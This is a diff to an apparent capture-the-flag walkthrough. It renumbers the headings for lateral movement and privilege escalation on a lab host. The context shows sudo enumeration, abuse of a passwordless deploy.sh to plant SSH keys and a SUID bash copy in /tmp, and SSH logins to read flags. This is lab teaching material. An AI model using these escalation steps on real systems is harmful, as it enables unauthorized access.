@@ -220,7 +220,7 @@ The SUID bit causes the binary to execute with the privileges of its owner.
 
 
 
-### 4.1 Connect as monitor_user
+### 4.2 Connect as monitor_user
 After the malicious ps script has been executed by the heaöthcheck process, coneect using SSH
 
 `ssh -i dev_rsa monitor_user@10.113.144.90`
@@ -237,7 +237,7 @@ Retrieve the flag
 
 ---
 
-## 6. Obtaining ops_user
+## 5. Obtaining ops_user
 Now enumerate the commands that **monitor_user** can execute with **sudo**
 
 `sudo -l`
@@ -253,7 +253,7 @@ The important part is `(ops_user) NOPASSWD: /usr/local/bin/deploy.sh`
 
 We can execute `deploy.sh` as `ops_user` without providing a password
 
-### 6.1 Exploiting deploy.sh
+### 5.1 Exploiting deploy.sh
 Inspect the script:
 
 `cat /usr/local/bin/deploy.sh`
@@ -279,11 +279,11 @@ chmod 600 /home/ops_user/.ssh/authorized_keys
 cp /bin/bash /tmp/opsbash
 chmod 4755 /tmp/opsbash
 ```
-### 6.2 Execute deploy.sh as ops_user
+### 5.2 Execute deploy.sh as ops_user
 Run:
 `sudo -u ops_user /usr/local/bin/deploy.sh`
 
-### 6.3 Connect as ops_user
+### 5.3 Connect as ops_user
 Use the SSH key:
 
 `ssh -i dev_rsa ops_user@10.113.144.90`
@@ -297,7 +297,10 @@ Verify the user:
 Retrive the flag
 
 `cat flag.txt`
-## 7 Obtaining root
+
+---
+
+## 6 Obtaining root
 Enumerate the available sudo permissions
 `sudo -l`
 
